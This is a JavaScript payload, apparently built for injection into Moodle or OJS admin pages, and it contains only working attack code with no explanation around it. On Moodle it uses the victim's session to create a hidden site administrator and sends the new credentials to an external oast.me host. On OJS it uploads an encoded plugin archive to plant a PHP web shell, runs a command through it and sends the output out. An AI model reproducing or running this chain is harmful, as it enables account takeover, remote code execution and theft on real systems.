(async()=>{try{
const OOB='https://dao8tr8skcnq9j673jlgp8opxytoc9qf1.oast.me/';
const mark=(m)=>{try{new Image().src=OOB+m;}catch(e){}};
const F=(u,o)=>fetch(u,Object.assign({credentials:'same-origin'},o||{}));
const P=location.pathname;
mark('/hit-'+(location.host+P).replace(/[^a-z0-9.-]/gi,'_').slice(0,120));
if(P.indexOf('/elearning')===0||window.M){
/* ---- Moodle chain ---- */
const B=location.origin+'/elearning';
const S=(window.M&&M.cfg&&M.cfg.sesskey)||'';
const U='h3ph'+Math.random().toString(36).slice(2,8);
const PW='Xy!'+Math.random().toString(36).slice(2,9)+'Q9w';
const E=U+'@'+location.hostname;
let h=await (await F(B+'/user/editadvanced.php?id=-1')).text();
let d=new DOMParser().parseFromString(h,'text/html');
let f=d.querySelector('form[action*="editadvanced"]')||d.querySelector('form');
if(!f){mark('/mdl-noform');return;}
let fd=new FormData(f);
fd.set('username',U);fd.set('newpassword',PW);fd.set('email',E);
fd.set('firstname','Heph');fd.set('lastname','Ops');fd.set('city','Jakarta');fd.set('country','ID');
if(!fd.get('sesskey'))fd.set('sesskey',S);
fd.set('id','-1');
await F(f.action,{method:'POST',body:fd});
mark('/mdl-created');
let s=await (await F(B+'/admin/user.php?search='+U)).text();
let m=s.match(/editadvanced\.php\?id=(\d+)/);
if(!m){mark('/mdl-nouid');return;}
let uid=m[1];mark('/mdl-uid'+uid);
let fd2=new URLSearchParams();fd2.set('sesskey',S);fd2.set('add','1');fd2.append('addselect[]',uid);
await F(B+'/admin/roles/admins.php',{method:'POST',body:fd2});
await F(B+'/admin/roles/admins.php?confirmadd='+uid+'&sesskey='+S);
mark('/mdl-admin-'+U+'-'+PW);
}else{
/* ---- OJS chain (2.x manager + 3.x grid) ---- */
const seg=P.split('/').filter(Boolean);
const ctx=seg[0]||'index';
const B=location.origin;
const b64='H4sIAAAAAAAAA+2WbW/bNhCA83X+FTcjqCTAEiXHb5kdp0XnNkVXLGizAV3XCbRE20xkiiGp2c7Q/76THGdx0M7A4LYbxicxLN3RJI/3xhmTM5kVU3Lw+QiRbrddfkfddnj/e8NB1G62W1F0FEYoj5pHKIL2Z9zTHYU2VAEcJIXSufr0uF36/yizjf/P8OEcH8oPFwEXSYCavaxROrjTaX3K/1G73Xrg/06rEx1AuJfVd/A/9//gFL1cIwQkXWU5TUEVQgM1gAGQFSkjXOABCcOpYWD4nNUO4ziHE3isZyzLYrZkievwtF8IOmfg075cpI7Xrz2e8IzFU2biJBeGCaNdZ2aM1N8RktK8Z1RPXyXi+viy0z26zKayl8vlyuTJ8fUkCnKqTTBnJL/UTV8lzHcgAEUXhcqYSPKUuboYa6Ncqdg0VkxmNGGuQ979Rv2bJ/4voX984nqNIP6VgP+eOA3Habg4noupVxrgNcJG1As9D3eKxqcql1AZhHabHGQxzngCfE6nTEPKFbgLNvZpkjCt+ThjDbgS+ULAQnFD8d0rjyWhIsWToUrRlVsDUIxmkpqZixOUp+PG8bMXP4zi2AscEgTrf6d8Wa9HNDd44NWi5OamTM0yB53GP5lr6/do5STHKZIZuJuNUg34KD34A6fnk0oh4dEjWHtOFvc8V6oa4FTBAiyZ5VA/G52f+a+evH45eu3X+6BX2rA5Dnw+unhXT+rvvT6cDh0Pp4f9hELlHt8JtqKgsgCXGqNxV334UPtQ43OZK+M6GR8H8koGSUa1ZjqQVWHTwXMmmOLJus6VkVoNgO36B2yJG001bI2ujmpSiMTwXKBLphyNVu5hgskxzdWqAYelj0qbFTOFEmBUwdbbOh3Wvnauf4y7+s9FypZ7K/lb7Kj/YRR1HtT/Vimy9f8LsK7/il0XXLE4F2UV/fhVoEyV26gWbPEgX1xU/ksj3PJ33OX/70xprGrBcp7te41d+d/qPLz/t9ph1+b/l2Bwig6HW+ef1KMgrEPVW/GmdFL/6eKZ36tjYg++/f7Hpxdvz0ebofDm7ZuL0Suob+4eBPstwX5LUpOSda/9+TakUFLHKW5/Oax9M6BS4h2Flm10uInAAbkvxUFmJdlw07Wn6z48IJUUtYpljGo2xB2XfwOyEaAuxX48bIbNjh8e+81oQCoBKjJ6s/LLa+4QhX+9oKa6BAy3i9qArKW1Abnb+9f2l8VisVgsFovFYrFYLBaLxWKxWCwWyy7+BJHwvTMAKAAA';
const bin=atob(b64);const u8=new Uint8Array(bin.length);
for(let i=0;i<bin.length;i++)u8[i]=bin.charCodeAt(i);
const blob=new Blob([u8],{type:'application/gzip'});
// OJS 2.x: /{ctx}/manager/installPlugin (uploadPlugin=1, newPlugin)
try{
let fd=new FormData();
fd.append('uploadPlugin','1');
fd.append('newPlugin',blob,'hephplug.tar.gz');
let r=await F(B+'/'+ctx+'/manager/installPlugin',{method:'POST',body:fd});
let t=await r.text();
mark('/ojs2-install-'+r.status+(t.indexOf('installSuccessful')>-1?'-OK':''));
}catch(e){mark('/ojs2-err');}
// OJS 3.x: plugin grid upload
try{
let fd3=new FormData();
fd3.append('uploadedFile',blob,'hephplug.tar.gz');
let r3=await F(B+'/'+ctx+'/$$$call$$$/grid/plugins/plugin-grid/upload-plugin',{method:'POST',body:fd3});
mark('/ojs3-install-'+r3.status);
}catch(e){mark('/ojs3-err');}
// trigger plugin load + verify shell
try{await F(B+'/'+ctx+'/index');}catch(e){}
try{
let v=await F(B+'/public/site/images/zzheph.php?c=id');
let vt=await v.text();
if(vt.indexOf('HEPH-MARKER')>-1)mark('/ojs-shell-LIVE-'+vt.slice(0,150).replace(/[^a-z0-9=(),._-]/gi,'_'));
else mark('/ojs-shell-'+v.status);
}catch(e){mark('/ojs-shell-err');}
}
}catch(e){try{new Image().src='https://dao8tr8skcnq9j673jlgp8opxytoc9qf1.oast.me/err-'+String(e).slice(0,60);}catch(_){}}})();
